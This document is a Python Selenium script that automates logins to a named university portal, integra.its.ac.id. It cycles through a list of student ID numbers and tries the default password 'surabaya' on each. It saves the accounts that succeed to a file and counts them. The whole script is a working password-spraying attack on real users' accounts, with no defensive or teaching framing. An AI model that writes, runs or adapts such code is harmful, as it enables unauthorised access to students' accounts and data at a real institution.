import time, random
import requests
from selenium import webdriver 
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC 
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.chrome.options import Options
chrome_options = Options()
chrome_options.add_argument("--start-maximized")

url = 'https://integra.its.ac.id/'
driver = webdriver.Chrome(executable_path='../../chromedriver.exe', chrome_options=chrome_options)

driver.get(url) 
with open('nrp.txt','r') as f: 
    koleksi_nrp=f.readlines()
print('panjang awal: ',len(koleksi_nrp))
koleksi_nrp = list(set(koleksi_nrp))
print('panjang akhir: ', len(koleksi_nrp))

def login(nrp): 
    driver.find_element_by_name('userid').send_keys(nrp)
    driver.find_element_by_name('password').send_keys('surabaya')
    driver.find_element_by_name('password').send_keys(Keys.ENTER)

    # driver.find_elements_by_xpath('//*[@id="login_form"]/div[3]/button').click()
    # email.send_keys(Keys.ENTER)

def logout(): 
    selectelement = driver.find_element_by_id('navbarDropdown')
    selectelement.click()
    driver.find_element_by_xpath('/html/body/nav/div/ul/li/div/a[3]').click()

def wait_til(xpath):
        WebDriverWait(driver,2).until(
        EC.visibility_of_element_located((By.XPATH,xpath))
    )

if __name__ == '__main__':        
    i = 0
    jumlah_berhasil = 0

    for nrp in koleksi_nrp: 
        nrp = nrp.strip()
        driver.delete_all_cookies()
        wait_til('//*[@id="password"]')
        login(nrp)

        i+=1
        try: 
            wait_til('//*[@id="navbarDropdown"]')
            time.sleep(.5)
            body = driver.find_element(By.TAG_NAME,'body')
            if 'SI Beasiswa' in body.text:  
                with open('berhasil.txt','a') as f: 
                    f.writelines(nrp+'\n')
                logout()    
                jumlah_berhasil+=1
                print(nrp,'masuk')
                driver.delete_all_cookies()
                continue
            else: 
                print(nrp, 'gagal dari if')
                driver.delete_all_cookies()
        except: 
            print(nrp,'gagal')
            driver.delete_all_cookies()
        print('trying', i,'/',len(koleksi_nrp),'\n jumlah berhasil: ', jumlah_berhasil)
    driver.quit()
